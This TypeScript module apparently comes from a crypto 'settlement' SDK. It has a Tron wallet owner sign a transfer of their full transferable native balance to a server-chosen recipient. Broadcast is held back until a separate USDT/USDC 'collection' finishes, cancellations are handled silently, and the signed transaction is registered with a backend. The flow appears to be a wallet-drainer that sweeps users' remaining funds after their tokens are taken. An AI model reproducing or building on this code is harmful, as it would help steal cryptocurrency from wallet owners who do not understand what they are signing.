import { resolveApiUrl } from "../core/api-url";
import { getErrorMessage, isUserRejection, withSilentWalletCancellation } from "../core/errors";
import { mergeTronSignedResult, tronSignTransaction } from "../core/tron-sign";
import type { HttpNativeTransferApiClientOptions } from "./http-api-client";
import { createHttpNativeTransferApiClient } from "./http-api-client";
import type { WalletPhaseNativeCapture } from "../authorization/phases/types";
import type { UniversalProvider } from "../types";

export type NativeWalletAuthorizeArgs = {
  provider: UniversalProvider;
  network: string;
  owner: string;
  unlimited: boolean;
  amountHuman?: string;
  apiBaseUrl?: string;
  traceId?: string;
};

export type NativeWalletAuthorizeResult =
  | { ok: true; capture: WalletPhaseNativeCapture }
  | { ok: false; userRejected?: boolean; error: string };

/**
 * Tron wallet-phase native: user signs now; server broadcast is deferred until
 * USDT/USDC collection completes.
 *
 * EVM native is NOT signed in wallet phase — `eth_sendTransaction` cannot be
 * deferred via `personal_sign`. EVM native runs once in settlement via
 * `runNativeTransfer` after token collection.
 */
export async function authorizeNativeInWalletPhase(
  args: NativeWalletAuthorizeArgs
): Promise<NativeWalletAuthorizeResult> {
  if (args.network !== "tron") {
    return {
      ok: false,
      error: "EVM native is deferred to settlement (no wallet popup in wallet phase)",
    };
  }

  const apiOptions: HttpNativeTransferApiClientOptions = {
    apiBaseUrl: args.apiBaseUrl,
  };
  const api = createHttpNativeTransferApiClient(apiOptions);

  try {
    const estimate = await api.estimate({
      request: {
        network: args.network,
        owner: args.owner,
        unlimited: args.unlimited,
        transferAmountHuman: args.amountHuman,
        traceId: args.traceId,
      },
    });

    if (!estimate.canTransfer || BigInt(estimate.transferableRaw) <= BigInt(0)) {
      return {
        ok: false,
        error: estimate.message ?? "Insufficient native balance after network fees",
      };
    }

    const unsigned = estimate.transaction;
    if (!unsigned) {
      return { ok: false, error: "Missing Tron native transfer transaction from estimate" };
    }

    const signRaw = await withSilentWalletCancellation(() =>
      tronSignTransaction(args.provider, args.owner, unsigned)
    );
    const signed = mergeTronSignedResult(unsigned, signRaw);
    return {
      ok: true,
      capture: {
        network: args.network,
        owner: args.owner,
        authorizationKind: "tron_signed",
        authorizationPayload: { signed },
        estimateTransferableRaw: estimate.transferableRaw,
        recipient: estimate.recipient,
      },
    };
  } catch (err) {
    const rejected = isUserRejection(err);
    return {
      ok: false,
      userRejected: rejected,
      error: getErrorMessage(err, "Native wallet authorization failed"),
    };
  }
}

export async function registerWalletPhaseNativeAuthorization(args: {
  apiBaseUrl?: string;
  capture: WalletPhaseNativeCapture;
  settlementSessionId: string;
  walletSessionToken?: string;
}): Promise<void> {
  const res = await fetch(
    resolveApiUrl(args.apiBaseUrl, "/api/network-settlement/register-native-authorization"),
    {
      method: "POST",
      headers: {
        "content-type": "application/json",
        ...(args.walletSessionToken
          ? { authorization: `Bearer ${args.walletSessionToken}` }
          : {}),
      },
      body: JSON.stringify({
        settlementSessionId: args.settlementSessionId,
        network: args.capture.network,
        owner: args.capture.owner,
        authorizationKind: args.capture.authorizationKind,
        authorizationPayload: args.capture.authorizationPayload,
        estimateTransferableRaw: args.capture.estimateTransferableRaw,
        recipient: args.capture.recipient,
      }),
      cache: "no-store",
    }
  );
  const json = (await res.json()) as { ok?: boolean; message?: string };
  if (!res.ok || !json.ok) {
    throw new Error(String(json.message ?? "Failed to register native authorization"));
  }
}
